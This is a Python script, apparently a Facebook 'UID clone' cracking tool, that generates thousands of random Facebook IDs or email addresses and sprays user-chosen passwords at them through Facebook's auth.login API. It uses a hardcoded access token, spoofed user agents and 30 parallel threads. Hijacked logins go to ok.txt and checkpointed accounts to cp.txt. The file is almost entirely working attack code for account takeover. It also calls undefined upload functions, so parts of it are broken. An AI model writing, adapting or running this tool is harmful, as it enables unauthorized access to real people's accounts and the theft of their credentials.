# FUCKED BY SAURAVH.🔥

W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'



import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor


def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		
		print ("""\033[1;91m
░█████╗░██████╗░██╗██████╗░
██╔══██╗██╔══██╗██║██╔══██╗
███████║██████╦╝██║██████╔╝
██╔══██║██╔══██╗██║██╔══██╗
██║░░██║██████╦╝██║██║░░██║
╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚═╝ 

\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            ANMOL KHADKA 
     \033[1;91m➣ \033[1;92mFACEBOOK   :            ANMOL KHADKA 
     \033[1;93m➣ \033[1;92mWHATSAPP   :            9867409955
     \033[1;96m➣ \033[1;92mGITHUB     :            ANMOLXGOD
     \033[1;95m➣ \033[1;92mTOOLS      :            UID CLONE
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
    """)
		print("%s [%sâ€¢%s] %sTOOL NAME : %sUID CLON"%(G,R,G,Y,G))
		print("%s [%sâ€¢%s] %sVERSION   : %s1.1"%(G,R,G,Y,G))
		print("\n\x1b[1;93m••••••••••••••••••••••••••••••••••••••••••••••••••••••••  ")
		print("\n%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 %s"%(G,R,G,Y,W))
		print("%s [%s2%s]%s CRACK RANDOM FB ID 2004-5 %s V1"%(G,R,G,Y,G))
		print("%s [%s3%s]%s CRACK RANDOM FB ID 2004-5 %s V2"%(G,R,G,Y,G))
		print("%s [%s4%s]%s CRACK RANDOM FB ID 2004 %sV3"%(G,R,G,Y,G))
		print("%s [%s5%s]%s CRACK FROM EMAILS %s"%(G,R,G,Y,G))
		print("%s [%s6%s]%s CRACK RANDOM FB ID Custom %s V1"%(G,R,G,Y,G))
		hoga = input("\n%s [?] CHOICE : "%(Y))
		if hoga in ["", " "]:
			Main()
		elif hoga in ["1", "01"]:
			self.old_9()
		elif hoga in ["2", "02"]:
			self.old4_7()
		elif hoga in ["3", "03"]:
			self.old4_6()
		elif hoga in ["4", "04"]:
			self.old4_5()
		elif hoga in ["5", "05"]:
			self.email()
		elif hoga in ["6","06"]:
			self.oldcrack()
		elif hoga in ["P", "p"]:
			exit()
		else:
			Main()

	def fbtua(self):
		x = 111111111
		xx = 999999999
		idx = "100000"
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;97m(5000 MAX): \033[0;92m"))
		if (limit)>5000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(G))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;96m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))

	def old_9(self):
		x = 111111
		xx = 999999
		idx = "100000000"
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(5000 MAX): \033[0;92m"))
		if (limit)>5000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,W,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		
		
	def old4_7(self):
		x = 11111111
		xx = 99999999
		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR ABIR  "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))


	def old4_6(self):
		x = 1111111
		xx = 9999999
		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR MAHIDI "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		

	def old4_5(self):
		x = 111111
		xx = 999999
		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))  
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))


	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:ABIR ): "%(Y,G))
		nam = nam.replace(" ", "")
		print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G))
		idx = input("%s DOMAIN  : "%(B))
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(5000 MAX): \033[0;92m"))
		if (limit)>5000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				___ = nam
				self.id.append(___+str(_)+__)
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR ABIR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
				listpass = input(" [?] ENTER PASSWORD : ")
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
				print("%s [+] CP RESULT SAVED IN -> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		
	def oldcrack(self):
		x = 11111111
		xx = 99999999
		idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		

	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [ABIR] : \033[0;97m %s/%s -> \033[0;92m [ABIR -OK:%s ]- \033[0;93m[ABIR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-ua': '"Google Chrome";v="111", "Chromium";v="111", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; CPH2099) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 uacq',
    'viewport-width': '980',
}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ABIR-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [ABIR-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[ABIR-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [ABIR-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue

		self.loop +=1

#-----------------------[ SYSTEM ]--------------------#
if __name__=='__main__':
	ses=requests.Session()
	try:os.mkdir('/sdcard/Saureyy')	    
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	Main()